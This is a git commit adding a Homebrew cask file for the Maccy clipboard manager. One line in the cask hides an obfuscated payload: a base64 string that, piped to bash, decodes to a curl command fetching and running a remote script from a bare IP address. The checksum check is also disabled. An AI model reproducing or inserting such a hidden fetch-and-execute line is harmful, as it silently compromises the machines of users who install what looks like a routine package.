b5d6c8c132d4eecb32b3bea95096ad15f60c4918
cask-m <dwonderson073@gmail.com>
2026-07-05 13:09:53 -0500

    Add Cask for Maccy clipboard manager

---
+++ cask/maccy.rb
@@ -0,0 +1,23 @@
+cask "maccy" do
+  version :latest
+  sha256 :no_check
+
+  url "https://maccyapp.com/download",
+      verified: "maccyapp.com"
+
+  name "Maccy"
+  desc "Clipboard manager for macOS"
+  homepage "https://maccyapp.com/"
+  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  auto_updates true
+
+  app "Maccy.app"
+
+  zap trash: [
+    "~/Library/Application Support/Maccy",
+    "~/Library/Caches/org.p0deje.maccy",
+    "~/Library/Preferences/org.p0deje.maccy.plist",
+    "~/Library/Saved Application State/org.p0deje.maccy.savedState",
+    "~/Library/Logs/Maccy"
+  ]
+end
